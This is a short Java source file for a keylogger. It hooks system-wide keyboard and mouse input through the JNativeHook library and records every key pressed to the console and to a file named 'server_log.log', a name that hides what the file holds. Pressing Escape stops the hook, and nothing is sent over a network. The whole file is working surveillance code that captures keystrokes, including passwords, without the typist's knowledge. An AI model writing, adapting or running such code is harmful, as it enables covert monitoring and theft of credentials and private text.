package keylogger;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class keylogger implements NativeKeyListener,NativeMouseInputListener  {
	
	static Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

	
	public void nativeKeyPressed(NativeKeyEvent e) {
		logger.setLevel(Level.SEVERE);
		logger.severe("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		logger.setLevel(Level.OFF);
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
			try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
				e1.printStackTrace();
			}
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		//logger.info("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		//logger.info("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public static void main(String[] args) throws SecurityException, IOException {

		logger.setLevel(Level.OFF);
		FileHandler fh = new FileHandler("server_log.log");
		logger.addHandler(fh);
		logger.addHandler(new java.util.logging.ConsoleHandler());
		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
		
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			logger.info("There was a problem registering the native hook.");
			logger.info(ex.getMessage());

			System.exit(1);
		}
		keylogger k = new keylogger();
		GlobalScreen.addNativeKeyListener(k);
		GlobalScreen.addNativeMouseListener(k);
		GlobalScreen.addNativeMouseMotionListener(k);
	}

	@Override
	public void nativeMouseClicked(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}